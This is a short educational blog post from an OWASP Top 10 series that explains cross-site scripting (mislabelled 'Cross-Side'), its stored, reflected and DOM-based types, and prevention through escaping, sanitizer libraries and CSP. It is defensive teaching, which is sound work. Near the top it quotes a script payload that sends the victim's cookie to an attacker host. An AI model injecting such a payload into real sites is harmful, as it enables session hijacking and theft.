---
layout: post
title: "What are Cross-side Scripting Flaws?"
date: 2016-03-21 20:43:31
image: '/assets/img/'
description:
tags:
- OWASP
- Security
categories:
- OWASP Top10
twitter_text: What are Cross-side Scripting Flaws? - On Code Bucket
---

This post is part of a compilation talking about the ten most common security flaws for web applications. To see them all, [click here](/tags/#OWASP).

***

### What are Cross-Side Scripting (XSS) flaws?

[OWASP](https://www.owasp.org) defines Cross-Side Scripting (XSS) Flaws as

> Systems that use non-trusted data written by a user without proper validation or escaping, allowing attackers to execute scripts in the victim's browsers, hijacking user sessions, defacing web sites or redirecting the user to malicious web sites.

So, if your application accepts user inputs in a form such as
```
'<script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo=' + document.cookie </script>'
```

Without proper validation or escaping, your application is vulnerable to a XSS flaw.

There are three main types of XXS flaws. They can be Stored, Reflected or DOM-based.
Stored XSS flaws happen when the attacker sends a malicious script to be saved by a database, for example. Whenever you request that information, the user's browser will interpret the script and the flaw will happen.
Reflected XSS flaws happen when your application uses the attacker's input to return something in the webpage as a result (for example, the input string for a search). If there's a script, then the browser will interpret the script and run when the response page gets loaded in your browser.
DOM-Based XSS are the flaws that makes the browser reinterpret the DOM unexpectedly. A simple example of that would be using alert("Hello") as an input for a form field. Whenever we fetch that information back, we'll be generating a pop-up window with "Hello" written in it.

### What can be the impacts of a Cross-Side Scripting Attack?
Attackers can execute scripts in a victim's browser to hijack user sessions, deface websites, insert hostile content, redirect users, hijack the user's browser using malware, etc. The business impact depends on the application data it holds and on the business impact of publicly exposing this vulnerability.

### How can I prevent this from happening?
There are automated tools that can find some XSS flaws automatically. However, each application builds different outputs and uses differente browser interpreters, like JavaScript, ActiveX, Flash, Silverlight, making automatic detecction harder. To a complete coverage, you will need to combine manual code reviews with penetration testing and automatic approaches.
XSS preventing requires separation of untrusted data from the active browser content.

You can escape all untrusted data based on the HTML context we'll be placing ([OWASP has a spreadsheet with data escaping techniques](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)), use positive or "whitelist" input validation - it's not the best defense if you use special characters in your input -, auto-sanitization libraries, like [AntiSamy](https://www.owasp.org/index.php/AntiSamy) or the [Java HTML Sanitizer Project](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project), and lastly you can also consider the Content Security Policy to defend your entire site against XSS.
